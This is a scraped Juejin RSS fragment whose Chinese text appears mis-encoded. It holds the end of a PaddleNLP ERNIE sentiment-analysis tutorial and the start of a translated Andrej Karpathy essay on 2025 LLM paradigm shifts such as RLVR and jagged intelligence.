    <span class="hljs-string">'æˆ¿é—´éš”éŸ³å¤ªå·®äº†ï¼Œæ™šä¸Šæ ¹æœ¬ç¡ä¸ç€ã€‚'</span>,
    <span class="hljs-string">'æœåŠ¡æ€åº¦ä¸€èˆ¬ï¼Œæ²¡ä»€ä¹ˆç‰¹åˆ«çš„æ„Ÿè§‰ã€‚'</span>, <span class="hljs-comment"># è¿™æ¡å¯èƒ½æ¯”è¾ƒä¸­æ€§ï¼Œçœ‹çœ‹æ¨¡å‹çš„åˆ¤æ–­</span>
    <span class="hljs-string">'é£æ™¯ä¸é”™ï¼Œä½†æ˜¯äº¤é€šä¸å¤ªæ–¹ä¾¿ã€‚'</span>      <span class="hljs-comment"># åŒ…å«æ­£è´Ÿä¸¤æ–¹é¢ä¿¡æ¯</span>
]

<span class="hljs-comment"># è¿›è¡Œé¢„æµ‹</span>
<span class="hljs-keyword">if</span> <span class="hljs-string">'model'</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">globals</span>():
    results = predict(model, tokenizer, data_to_predict, label_map)
    <span class="hljs-keyword">for</span> text, label <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(data_to_predict, results):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ–‡æœ¬: <span class="hljs-subst">{text}</span> -&gt; é¢„æµ‹æƒ…æ„Ÿ: <span class="hljs-subst">{label}</span>"</span>)
<span class="hljs-keyword">else</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ¨¡å‹æœªåŠ è½½ï¼Œæ— æ³•è¿›è¡Œé¢„æµ‹ã€‚"</span>)
</code></pre>
<p>é€šè¿‡è¿™ä¸ªÂ <code>predict</code>Â å‡½æ•°ï¼Œæ‚¨å°±å¯ä»¥æ–¹ä¾¿åœ°å°†è®­ç»ƒå¥½çš„æƒ…æ„Ÿåˆ†æèƒ½åŠ›é›†æˆåˆ°æ‚¨è‡ªå·±çš„åº”ç”¨ä¸­ï¼Œæˆ–è€…ç”¨å®ƒæ¥åˆ†æä»»ä½•æ‚¨æ„Ÿå…´è¶£çš„ä¸­æ–‡æ–‡æœ¬äº†ï¼</p>
<h3 data-id="heading-22">7. æ€»ç»“ä¸å±•æœ›</h3>
<p>æœ¬æ•™ç¨‹ä»é›¶å¼€å§‹ï¼Œå¸¦æ‚¨å®Œæˆäº†åŸºäºERNIEæ¨¡å‹çš„ä¸­æ–‡æƒ…æ„Ÿåˆ†æä»»åŠ¡çš„æ•´ä¸ªæµç¨‹ã€‚</p>
<p><strong>æˆ‘ä»¬å›é¡¾ä¸€ä¸‹æ ¸å¿ƒæ­¥éª¤</strong>ï¼š</p>
<ol>
<li><strong>ç¯å¢ƒå‡†å¤‡</strong>ï¼šå®‰è£…äº†PaddlePaddleå’ŒPaddleNLPã€‚</li>
<li><strong>æ•°æ®æ¢ç´¢</strong>ï¼šåŠ è½½å¹¶åˆ†æäº†<code>ChnSentiCorp</code>æ•°æ®é›†ã€‚</li>
<li><strong>æ•°æ®é¢„å¤„ç†</strong>ï¼šä½¿ç”¨ERNIE Tokenizerå¯¹æ–‡æœ¬è¿›è¡Œç¼–ç ï¼Œå¹¶åˆ›å»ºäº†DataLoaderã€‚</li>
<li><strong>æ¨¡å‹å¾®è°ƒ</strong>ï¼šåŠ è½½<code>ErnieForSequenceClassification</code>æ¨¡å‹ï¼Œå®šä¹‰ä¼˜åŒ–å™¨å’ŒæŸå¤±å‡½æ•°ï¼Œå¹¶ç¼–å†™äº†è®­ç»ƒå’Œè¯„ä¼°å¾ªç¯ï¼Œæœ€ç»ˆè®­ç»ƒå¹¶ä¿å­˜äº†æœ€ä½³æ¨¡å‹ã€‚</li>
<li><strong>è¯„ä¼°ä¸é¢„æµ‹</strong>ï¼šåœ¨æµ‹è¯•é›†ä¸ŠéªŒè¯äº†æ¨¡å‹çš„æœ€ç»ˆæ€§èƒ½ï¼Œå¹¶åˆ›å»ºäº†ä¸€ä¸ªå®ç”¨çš„é¢„æµ‹å‡½æ•°æ¥åˆ†ææ–°æ–‡æœ¬ã€‚</li>
</ol>
<p><strong>åç»­å¯ä»¥æ¢ç´¢çš„æ–¹å‘</strong>ï¼š</p>
<ul>
<li><strong>å°è¯•æ›´å¼ºå¤§çš„æ¨¡å‹</strong>ï¼šå¯ä»¥å°è¯•<code>ernie-3.0-base-zh</code>æˆ–<code>ernie-3.0-xbase-zh</code>ç­‰æ›´å¤§è§„æ¨¡çš„ERNIEæ¨¡å‹ï¼Œå¯èƒ½ä¼šè·å¾—æ›´é«˜çš„å‡†ç¡®ç‡ã€‚</li>
<li><strong>å‚æ•°é«˜æ•ˆå¾®è°ƒ (PEFT)</strong> ï¼šå¯¹äºæ›´å¤§çš„æ¨¡å‹ï¼Œå…¨å‚æ•°å¾®è°ƒæˆæœ¬è¾ƒé«˜ã€‚å¯ä»¥å­¦ä¹ ä½¿ç”¨LoRAç­‰PEFTæ–¹æ³•ï¼Œåœ¨å†»ç»“å¤§éƒ¨åˆ†ERNIEå‚æ•°çš„æƒ…å†µä¸‹è¿›è¡Œå¾®è°ƒï¼Œæ˜¾è‘—é™ä½èµ„æºæ¶ˆè€—ã€‚</li>
<li><strong>ä¸‰åˆ†ç±»ä»»åŠ¡</strong>ï¼šåœ¨æ›´å¤æ‚çš„æ•°æ®é›†ä¸Šè¿›è¡Œï¼ˆç§¯æã€æ¶ˆæã€ä¸­æ€§ï¼‰ä¸‰åˆ†ç±»ä»»åŠ¡ã€‚</li>
<li><strong>æ¨¡å‹éƒ¨ç½²</strong>ï¼šå­¦ä¹ å¦‚ä½•å°†è®­ç»ƒå¥½çš„æ¨¡å‹å¯¼å‡ºä¸ºé™æ€å›¾æ ¼å¼ï¼Œå¹¶ä½¿ç”¨Paddle Servingæˆ–FastDeployè¿›è¡ŒæœåŠ¡åŒ–éƒ¨ç½²ï¼Œä»¥ä¾›ç”Ÿäº§ç¯å¢ƒä½¿ç”¨ã€‚</li>
<li><strong>åº”ç”¨åˆ°æ‚¨è‡ªå·±çš„æ•°æ®</strong>ï¼šå°†æœ¬æ•™ç¨‹çš„æµç¨‹åº”ç”¨åˆ°æ‚¨è‡ªå·±é¢†åŸŸçš„æ–‡æœ¬æ•°æ®ä¸Šï¼Œæ„å»ºä¸€ä¸ªå®šåˆ¶åŒ–çš„æƒ…æ„Ÿåˆ†æç³»ç»Ÿã€‚</li>
</ul>
<p>å¸Œæœ›æœ¬æ•™ç¨‹èƒ½å¸®åŠ©æ‚¨æˆåŠŸå…¥é—¨ä¸­æ–‡æ–‡æœ¬åˆ†ç±»ä»»åŠ¡ï¼å¦‚æœæ‚¨æœ‰ä»»ä½•é—®é¢˜ï¼Œæ¬¢è¿æŸ¥é˜…PaddleNLPçš„å®˜æ–¹æ–‡æ¡£æˆ–å‘ç¤¾åŒºæé—®ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Andrej Karpathyï¼š2025 å¹´ LLM é¢†åŸŸçš„å…­é¡¹èŒƒå¼è½¬å˜]]></title>    <link>https://juejin.cn/post/7592853243731689512</link>    <guid>https://juejin.cn/post/7592853243731689512</guid>    <pubDate>2026-01-09T02:53:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592853243731689512" data-draft-id="7592873628586098688" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Andrej Karpathyï¼š2025 å¹´ LLM é¢†åŸŸçš„å…­é¡¹èŒƒå¼è½¬å˜"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,LLM,é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-09T02:53:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Baihai_IDP"/> <meta itemprop="url" content="https://juejin.cn/user/3123071228582343"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Andrej Karpathyï¼š2025 å¹´ LLM é¢†åŸŸçš„å…­é¡¹èŒƒå¼è½¬å˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3123071228582343/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Baihai_IDP
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T02:53:35.000Z" title="Fri Jan 09 2026 02:53:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>ç¼–è€…æŒ‰ï¼š</strong> æˆ‘ä»¬ä»Šå¤©ä¸ºå¤§å®¶å¸¦æ¥çš„æ–‡ç« ï¼Œä½œè€…çš„æ ¸å¿ƒè§‚ç‚¹æ˜¯ï¼š2025Â å¹´å¤§è¯­è¨€æ¨¡å‹çš„çœŸæ­£çªç ´ä¸åœ¨äºå‚æ•°è§„æ¨¡çš„æ‰©å¼ ï¼Œè€Œåœ¨äºè®­ç»ƒèŒƒå¼ã€æ™ºèƒ½å½¢æ€ä¸åº”ç”¨æ¶æ„çš„æ·±å±‚è½¬å˜Â â€”â€”Â å°¤å…¶æ˜¯åŸºäºå¯éªŒè¯å¥–åŠ±çš„å¼ºåŒ–å­¦ä¹ ï¼ˆRLVRï¼‰ã€AIÂ ä½œä¸ºâ€œå¹½çµâ€è€Œéâ€œåŠ¨ç‰©â€çš„è®¤çŸ¥é‡æ„ï¼Œä»¥åŠé¢å‘å‚ç›´åœºæ™¯çš„æ–°å‹Â LLMÂ åº”ç”¨å±‚çš„å´›èµ·ã€‚</p>
<p>æ–‡ç« ç³»ç»Ÿå›é¡¾äº† 2025 å¹´ LLM é¢†åŸŸçš„å…­å¤§å…³é”®è¶‹åŠ¿ï¼šé¦–å…ˆï¼ŒRLVR æˆä¸ºæ–°è®­ç»ƒæ ¸å¿ƒï¼Œé€šè¿‡å¯è‡ªåŠ¨éªŒè¯çš„å¥–åŠ±ä¿¡å·ï¼Œæ¨¡å‹è‡ªå‘æ¼”åŒ–å‡ºç±»æ¨ç†è¡Œä¸ºï¼›å…¶æ¬¡ï¼Œä½œè€…æå‡ºâ€œå¬å”¤å¹½çµâ€éšå–»ï¼Œå¼ºè°ƒ LLM æ™ºèƒ½ä¸ç”Ÿç‰©æ™ºèƒ½åœ¨åº•å±‚é€»è¾‘ä¸Šçš„æ ¹æœ¬å·®å¼‚ï¼Œå¹¶è§£é‡Šäº†å…¶â€œé”¯é½¿çŠ¶æ™ºèƒ½â€â€”â€”åœ¨æŸäº›ä»»åŠ¡ä¸Šè¶…äººï¼Œåœ¨å¦ä¸€äº›ä»»åŠ¡ä¸Šå´å¼‚å¸¸è„†å¼±ï¼›ç¬¬ä¸‰ï¼Œä»¥ Cursor ä¸ºä»£è¡¨çš„æ–°å‹ LLM åº”ç”¨å±‚ï¼Œé€šè¿‡ä¸Šä¸‹æ–‡å·¥ç¨‹ã€å¤šè°ƒç”¨ç¼–æ’ä¸â€œè‡ªä¸»æ€§æ»‘å—â€ï¼Œæ­£åœ¨é‡å¡‘äººæœºåä½œèŒƒå¼ï¼›æ­¤å¤–ï¼ŒClaude Code å±•ç¤ºäº†æœ¬åœ°åŒ– AI æ™ºèƒ½ä½“çš„æ½œåŠ›ï¼Œvibe coding è®©ç¼–ç¨‹èµ°å‘å¤§ä¼—åŒ–ï¼Œè€Œ Google Gemini Nano banana åˆ™é¢„ç¤ºäº† LLM å›¾å½¢ç”¨æˆ·ç•Œé¢ï¼ˆGUIï¼‰çš„æœªæ¥æ–¹å‘ã€‚</p>
</blockquote>
<p><strong>ä½œè€… | Andrej Karpathy</strong></p>
<p><strong>ç¼–è¯‘ | å²³æ‰¬</strong></p>
<p>2025 å¹´æ˜¯å¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰å‘å±•åŠ¿å¤´å¼ºåŠ²ã€è¿›æ­¥æ˜¾è‘—çš„ä¸€å¹´ã€‚ä»¥ä¸‹æ˜¯æˆ‘ä¸ªäººè®¤ä¸ºå€¼å¾—å…³æ³¨ä¸”ç•¥æ„Ÿæ„å¤–çš„å‡ é¡¹â€œèŒƒå¼è½¬å˜â€ï¼Œè¿™äº›æ”¹å˜æŠ€æœ¯æ ¼å±€çš„æ¦‚å¿µæ€§çªç ´è®©æˆ‘å°è±¡æ·±åˆ»ã€‚</p>
<h2 data-id="heading-0"><strong>01 åŸºäºå¯éªŒè¯å¥–åŠ±çš„å¼ºåŒ–å­¦ä¹ ï¼ˆReinforcement Learning from Verifiable Rewards, RLVRï¼‰</strong></h2>
<p>2025 å¹´åˆï¼Œå„å¤§å®éªŒå®¤çš„ LLM ç”Ÿäº§è®­ç»ƒæµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š</p>
<p>1ï¼‰é¢„è®­ç»ƒï¼ˆGPT-2/3ï¼Œ~ 2020 å¹´ï¼‰</p>
<p>2ï¼‰ç›‘ç£å¾®è°ƒï¼ˆInstructGPTï¼Œ~ 2022 å¹´ï¼‰ä»¥åŠ</p>
<p>3ï¼‰åŸºäºäººç±»åé¦ˆçš„å¼ºåŒ–å­¦ä¹ ï¼ˆRLHFï¼Œ~ 2022 å¹´ï¼‰</p>
<p>è¿™å¥—æˆç†Ÿæ–¹æ¡ˆæ›¾é•¿æœŸè¢«è§†ä¸ºç”Ÿäº§çº§ LLM çš„è®­ç»ƒæ ‡å‡†ã€‚ç„¶è€Œåˆ°äº† 2025 å¹´ï¼ŒåŸºäºå¯éªŒè¯å¥–åŠ±çš„å¼ºåŒ–å­¦ä¹ ï¼ˆRLVRï¼‰ æˆä¸ºè¢«å¹¿æ³›æ¥å—å’Œé‡‡ç”¨çš„æ–°æ ¸å¿ƒè®­ç»ƒé˜¶æ®µã€‚é€šè¿‡åœ¨å¤šç§ç¯å¢ƒä¸­ï¼ˆä¾‹å¦‚æ•°å­¦é¢˜æˆ–ç¼–ç¨‹é¢˜è¿™ç±»åœºæ™¯ï¼‰è®© LLM é’ˆå¯¹å¯è‡ªåŠ¨éªŒè¯çš„å¥–åŠ±è¿›è¡Œè®­ç»ƒï¼Œæ¨¡å‹ä¼šè‡ªå‘åœ°å‘å±•å‡ºä¸€äº›åœ¨äººç±»çœ‹æ¥åƒæ˜¯â€œæ¨ç†â€çš„ç­–ç•¥ â€”â€” å®ƒä»¬å­¦ä¼šå°†é—®é¢˜æ±‚è§£è¿‡ç¨‹æ‹†è§£ä¸ºä¸€ç³»åˆ—ä¸­é—´è®¡ç®—æ­¥éª¤ï¼Œå¹¶æŒæ¡å¤šç§æ¥å›è¯•æ¢ã€é€æ­¥å˜æ¸…é—®é¢˜çš„è§£é¢˜ç­–ç•¥ï¼ˆå‚è§ DeepSeek R1 è®ºæ–‡ä¸­çš„ç¤ºä¾‹ï¼‰ã€‚åœ¨åŸæœ‰èŒƒå¼ä¸‹ï¼Œè¿™ç±»ç­–ç•¥æéš¾å®ç°ï¼Œå› ä¸º LLM å¹¶ä¸æ¸…æ¥šâ€œæœ€ä¼˜çš„æ¨ç†è·¯å¾„â€æˆ–â€œå¯¹é”™è¯¯çš„ä¿®æ­£æ–¹å¼â€ç©¶ç«Ÿé•¿ä»€ä¹ˆæ · â€”â€” å®ƒå¿…é¡»é€šè¿‡é’ˆå¯¹å¥–åŠ±ä¿¡å·çš„ä¼˜åŒ–è¿‡ç¨‹ï¼Œè‡ªå·±æ‘¸ç´¢å‡ºå¯¹è‡ªå·±æœ‰æ•ˆçš„æ–¹æ³•ã€‚</p>
<p>ä¸ SFT å’Œ RLHF è¿™ä¸¤ä¸ªè®¡ç®—é‡ç›¸å¯¹è¾ƒå°ã€è®­ç»ƒå‘¨æœŸè¾ƒçŸ­çš„é˜¶æ®µä¸åŒï¼ŒRLVR ä¾èµ–äºå®¢è§‚ï¼ˆä¸å¯ä½œå¼Šï¼‰çš„å¥–åŠ±å‡½æ•°ï¼Œå› æ­¤æ”¯æŒæ›´é•¿æ—¶é—´çš„ä¼˜åŒ–ã€‚<strong>äº‹å®è¯æ˜ï¼ŒRLVR åœ¨å•ä½ç®—åŠ›ä¸‹çš„èƒ½åŠ›æå‡ï¼ˆcapability / $ï¼‰éå¸¸é«˜ï¼Œå¯¼è‡´åŸæœ¬ç”¨äºé¢„è®­ç»ƒçš„è®¡ç®—èµ„æºè¢«å¤§é‡è½¬ç§»è‡³æ­¤ã€‚</strong> å› æ­¤ï¼Œ2025 å¹´å¤§éƒ¨åˆ†æ¨¡å‹èƒ½åŠ›çš„æå‡ï¼Œä¸»è¦æ¥è‡ªäºå„å¤§ LLM å®éªŒå®¤é›†ä¸­ç®—åŠ›â€œæ¶ˆåŒ–â€è¿™ä¸€æ–°è®­ç»ƒé˜¶æ®µï¼ˆRLVRï¼‰æ‰€é‡Šæ”¾å‡ºçš„æ½œåŠ›ã€‚æ€»ä½“æ¥çœ‹ï¼Œæˆ‘ä»¬çœ‹åˆ°çš„æ¨¡å‹å‚æ•°è§„æ¨¡å¤§è‡´ç›¸å½“ï¼Œä½†å¼ºåŒ–å­¦ä¹ ï¼ˆRLï¼‰çš„è®­ç»ƒæ—¶é•¿æ˜¾è‘—å¢åŠ ã€‚æ­¤å¤–ï¼Œè¿™ä¸€æ–°é˜¶æ®µè¿˜å¸¦æ¥äº†ä¸€ä¸ªå…¨æ–°çš„â€œè°ƒèŠ‚æ—‹é’®â€ï¼ˆä»¥åŠä¸ä¹‹å¯¹åº”çš„ç¼©æ”¾è§„å¾‹ï¼‰ï¼šé€šè¿‡ç”Ÿæˆæ›´é•¿çš„æ¨ç†è½¨è¿¹ã€å¢åŠ â€œæ€è€ƒæ—¶é—´â€ï¼Œå³å¯åœ¨æ¨ç†æ—¶ä»¥æ›´å¤šè®¡ç®—æ¢å–æ›´å¼ºèƒ½åŠ›ã€‚OpenAI çš„ o1 æ¨¡å‹ï¼ˆ2024 å¹´åº•ï¼‰é¦–æ¬¡å±•ç¤ºäº† RLVR çš„æ•ˆæœï¼Œä½†çœŸæ­£è®©äººç›´è§‚æ„Ÿå—åˆ°è´¨å˜çš„æ‹ç‚¹ï¼Œæ˜¯ 2025 å¹´åˆå‘å¸ƒçš„ o3 ç‰ˆæœ¬ã€‚</p>
<h2 data-id="heading-1"><strong>02 Ghosts vs. Animals / Jagged Intelligence</strong></h2>
<p>2025 å¹´æ˜¯æˆ‘ï¼ˆè€Œä¸”æˆ‘è®¤ä¸ºæ•´ä¸ªè¡Œä¸šä¹Ÿæ˜¯å¦‚æ­¤ï¼‰ç¬¬ä¸€æ¬¡å¼€å§‹ä»¥æ›´ç›´è§‰ã€æ›´åˆ‡èº«çš„æ–¹å¼ï¼Œç†è§£ LLM æ™ºèƒ½çš„â€œå½¢æ€â€ã€‚æˆ‘ä»¬å¹¶éåœ¨â€œè¿›åŒ–/åŸ¹è‚²åŠ¨ç‰©â€ï¼Œè€Œæ˜¯åœ¨â€œå¬å”¤å¹½çµâ€ã€‚<strong>LLM æŠ€æœ¯æ ˆçš„æ–¹æ–¹é¢é¢ â€”â€” åŒ…æ‹¬ç¥ç»ç½‘ç»œæ¶æ„ã€è®­ç»ƒæ•°æ®ã€è®­ç»ƒç®—æ³•ï¼Œå°¤å…¶æ˜¯ç›®æ ‡å‡½æ•°å¯¹æ¨¡å‹è¡Œä¸ºçš„å¡‘é€ åŠ›ï¼ˆOptimization pressureï¼‰éƒ½ä¸ç”Ÿç‰©æ™ºèƒ½æˆªç„¶ä¸åŒï¼Œå› æ­¤æˆ‘ä»¬æ‰€è·å¾—çš„æ™ºèƒ½ä½“åœ¨æ™ºèƒ½ç©ºé—´ä¸­è‡ªç„¶ä¹Ÿå¤§ä¸ç›¸åŒï¼Œç”¨åŠ¨ç‰©çš„è§†è§’å»ç†è§£å®ƒä»¬æ˜¯ä¸æ°å½“çš„ã€‚</strong> å¦‚æœä»ç›‘ç£ä¿¡å·çš„åº•å±‚ä¿¡æ¯å•ä½æ¥çœ‹ï¼Œäººç±»çš„ç¥ç»ç½‘ç»œæ˜¯ä¸ºäº†åœ¨ä¸›æ—ä¸­ä¿éšœéƒ¨è½ç”Ÿå­˜è€Œä¼˜åŒ–çš„ï¼Œè€Œ LLM çš„ç¥ç»ç½‘ç»œåˆ™æ˜¯ä¸ºäº†æ¨¡ä»¿äººç±»æ–‡æœ¬ã€åœ¨æ•°å­¦éš¾é¢˜ä¸­è·å–å¯éªŒè¯å¥–åŠ±ï¼Œä»¥åŠåœ¨ LM Arena ä¸Šèµ¢å¾—äººç±»çš„ä¸€ä¸ªç‚¹èµè€Œä¼˜åŒ–çš„ã€‚éšç€å¯éªŒè¯çš„é¢†åŸŸæ”¯æŒ RLVRï¼Œå¤§è¯­è¨€æ¨¡å‹åœ¨è¿™äº›é¢†åŸŸåŠå…¶å‘¨è¾¹ä»»åŠ¡ä¸Šçš„èƒ½åŠ›ä¼šå‡ºç°â€œå°–å³°å¼â€è·ƒå‡ï¼Œä»è€Œæ•´ä½“å‘ˆç°å‡ºä¸€ç§ä»¤äººå¿ä¿Šä¸ç¦çš„ã€èµ·ä¼å‰§çƒˆçš„é”¯é½¿çŠ¶æ€§èƒ½ç‰¹å¾ï¼Œå®ƒä»¬å¯èƒ½åŒæ—¶æ˜¯ä¸€ä½é€šæ™“ä¸‡ç‰©çš„å¤©æ‰ï¼Œåˆæ˜¯ä¸€ä¸ªå……æ»¡å›°æƒ‘ä¸”è®¤çŸ¥èƒ½åŠ›å—é™çš„å°å­¦ç”Ÿï¼Œç”šè‡³åœ¨å‡ ç§’å†…å°±è¢«è¶Šç‹±æ”»å‡»ï¼ˆjailbreakï¼‰è¯±éª—ï¼Œå¯¼è‡´ä½ çš„æ•°æ®è¢«çªƒå–ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/69e21168c6b047b7a5e479c7bd630fa3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768532015&amp;x-signature=eRhBu7lg0YvmImcFbFRKrT23mXE%3D" alt="image.png" loading="lazy"/></p>
<p>ï¼ˆäººç±»æ™ºèƒ½ï¼šè“è‰²ï¼ŒAI æ™ºèƒ½ï¼šçº¢è‰²ã€‚æˆ‘å¾ˆå–œæ¬¢è¿™ä¸ªæ¢—å›¾ï¼ˆå¾ˆæŠ±æ­‰æˆ‘æ‰¾ä¸åˆ°äº†å®ƒæœ€åˆåœ¨ X ä¸Šçš„åŸå§‹å‡ºå¤„ï¼‰ï¼Œå› ä¸ºå®ƒæŒ‡å‡ºäººç±»æ™ºèƒ½æœ¬èº«ä¹Ÿä»¥è‡ªå·±ç‹¬ç‰¹çš„æ–¹å¼å‘ˆç°å‡ºâ€œé”¯é½¿çŠ¶â€ã€‚ï¼‰</p>
